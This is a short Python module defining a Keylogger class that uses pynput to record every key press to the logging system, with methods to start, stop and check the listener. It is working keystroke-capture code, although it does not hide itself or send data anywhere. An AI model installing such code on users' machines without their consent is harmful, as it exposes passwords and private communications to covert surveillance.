import logging
import threading


def onkeyboardevent(event):
    """ On Keyboard Event"""
    logging.info("%s", event)

class Keylogger:
    """ Keylogger """

    def __init__(self) -> None:
        """
        Check keylogger state from log
        then enable or disable it accordingly
        """
        try:
            from pynput.keyboard import Listener
        except ImportError:
            self.runnable = False
        else:
            self.runnable = True
            self.listener = Listener(on_press=onkeyboardevent)

    def start(self) -> bool:
        """ Start keylogger """
        if not self.runnable:
            logging.error('pynput not found, could not start keylogger')
            return False
        if not self.listener.running:
            self.listener.start()
            logging.info('Started Keylogger')
        return True

    def stop(self) -> bool:
        """ Attempt to stop the keylogger """
        if not self.runnable:
            logging.info('pynput not found')
            return False
        if self.listener.running:
            self.listener.stop()
            logging.info('Stopped Keylogger')
            threading.Thread.__init__(self.listener)
        return True

    def state(self) -> bool:
        """ Get the state of the keylogger """
        return self.listener.running
